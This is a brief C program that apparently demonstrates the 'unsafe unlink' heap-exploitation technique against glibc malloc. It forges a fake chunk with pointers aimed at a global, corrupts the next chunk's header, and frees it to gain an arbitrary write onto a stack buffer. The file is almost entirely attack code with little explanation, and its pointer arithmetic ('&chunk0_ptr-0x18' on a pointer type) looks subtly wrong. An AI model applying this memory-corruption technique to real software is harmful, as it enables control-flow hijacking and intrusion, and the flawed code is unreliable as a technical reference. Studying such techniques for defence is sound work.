#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	int header_size = 2;
	uint64_t *chunk1_ptr;
	uint64_t *chunk1_hdr;

	chunk0_ptr = malloc(0x420); //chunk0
	chunk1_ptr = malloc(0x420); //chunk1

	chunk0_ptr[1] = chunk0_ptr[-1] - 0x10;
	chunk0_ptr[2] = &chunk0_ptr-0x18;
	chunk0_ptr[3] = &chunk0_ptr-0x10;

	/*
	0 431
	0 420
	chunk0_ptr-0x18 chunk0_ptr-0x10
	*/

	chunk1_hdr = chunk1_ptr - header_size;

	chunk1_hdr[0] = 0x420;
	chunk1_hdr[1] &= ~1;

	free(chunk1_ptr);

	char victim_string[8];
	strcpy(victim_string, "Hello!~");
	chunk0_ptr[3] = victim_string;

	chunk0_ptr[0] = 0x4141414142424242LL;

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}

